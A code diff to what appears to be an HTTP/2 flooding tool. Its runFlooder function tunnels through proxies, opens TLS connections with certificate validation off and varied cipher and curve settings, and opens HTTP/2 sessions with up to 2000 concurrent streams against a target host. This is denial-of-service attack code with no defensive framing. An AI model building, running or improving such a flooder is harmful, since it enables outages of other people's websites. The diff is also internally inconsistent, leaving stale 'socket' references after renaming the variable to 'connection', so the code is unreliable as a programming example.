@@ -2945,27 +2945,27 @@ class NetSocket {
       `CONNECT ${proxyAddress}:${proxyPortNumber} HTTP/1.1\r\n` +
       `Host: ${proxyAddress}:${proxyPortNumber}\r\n` +
       "Proxy-Connection: Keep-Alive\r\n" +
-      "Connection: Keep-Alive\r\n\r\n";
+      "Connection: Keep-Alive\r\n\r\n";                                    
     
     const requestBuffer = Buffer.from(connectRequest);
 
     return new Promise((resolve, reject) => {
       // Create connection to proxy server
-      const socket = net.connect({
-        host: proxyHost,
-        port: proxyPort
+    const connection = net.connect({
+         host: options.host,
+         port: options.port
       });
 
       // Configure socket settings
-      socket.setTimeout(connectionTimeout * 1000); // Convert to milliseconds
-      socket.setKeepAlive(true, 100000); // 100 seconds keepalive
+      connection.setTimeout(connectionTimeout * 1000); // Convert to milliseconds
+      connection.setKeepAlive(true, 100000); // 100 seconds keepalive
 
       // Socket event handlers
-      socket.on("connect", () => {
-        socket.write(requestBuffer);
+      connection.on("connect", () => {
+        connection.write(requestBuffer);
       });
 
-      socket.on("data", (data) => {
+      connection.on("data", (data) => {
         const response = data.toString("utf-8");
         if (!response.includes("HTTP/1.1 200")) {
           socket.destroy();
@@ -2975,13 +2975,13 @@ class NetSocket {
         }
       });
 
-      socket.on("timeout", () => {
-        socket.destroy();
+      connection.on("timeout", () => {
+        connection.destroy();
         reject(new Error("error: timeout exceeded"));
       });
 
-      socket.on("error", (error) => {
-        socket.destroy();
+      connection.on("error", (error) => {
+        connection.destroy();
         reject(error);
       });
     })
@@ -3321,12 +3321,12 @@ function runFlooder() {
   };
 
   // Establish HTTP connection through proxy
-  Socker.HTTP(proxyOptions, (socket, error) => {
+  Socker.HTTP(proxyOptions, (connection, error) => {
     if (error) {
       return; // Skip if connection failed
     }
 
-    socket.setKeepAlive(true, 600000); // 10 minutes keepalive
+    connection.setKeepAlive(true, 600000); // 10 minutes keepalive
 
     // TLS connection configuration
     const tlsOptions = {
@@ -3363,7 +3363,7 @@ function runFlooder() {
       sigals: siga,
       socket: socket,
       ciphers: tls.getCiphers().join(':') + cipper,
-      ecdhCurve: "prime256v1:X25519",
+      ecdhCurve: ["prime256v1:X25519", "GREASE:X25519:x25519:P-256:P-384:P-521:X448"],
       host: parsedTarget.host,
       rejectUnauthorized: false, // Bypass SSL certificate validation
       servername: parsedTarget.host,
@@ -3372,8 +3372,9 @@ function runFlooder() {
     };
 
     // Create TLS connection
-    const tlsSocket = tls.connect(443, parsedTarget.host, tlsOptions);
-    tlsSocket.setKeepAlive(true, 60000); // 1 minute keepalive
+    const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); 
+
+    tlsConn.setKeepAlive(true, 60 * 10000 + Math.random() * 20000);
 
     // Create HTTP/2 connection
     const http2Connection = http2.connect(parsedTarget.href, {
@@ -3381,18 +3382,18 @@ function runFlooder() {
       settings: {
         headerTableSize: 65536,
         maxConcurrentStreams: 2000,
-        initialWindowSize: 65535,
-        maxHeaderListSize: 65536,
+        initialWindowSize: 6291456,
+        maxHeaderListSize: 262144,
         enablePush: false
       },
-      maxSessionMemory: 64000,
-      maxDeflateDynamicTableSize: 4294967295,
-      createConnection: () => tlsSocket,
-      socket: socket
+        maxSessionMemory: 64000,
+        maxDeflateDynamicTableSize: 4294967295,
+        createConnection: () => tlsConn,
+        socket: connection,
     });
 
     // Update HTTP/2 settings
-    http2Connection.settings({
+      http2Connection.settings({
       headerTableSize: 65536,
       maxConcurrentStreams: 2000,
       initialWindowSize: 6291456, // 6MB
@@ -3410,7 +3411,7 @@ function runFlooder() {
     
     http2Connection.on("error", (err) => {
       http2Connection.destroy();
-      socket.destroy();
+      connection.destroy();
     });
   });
 }
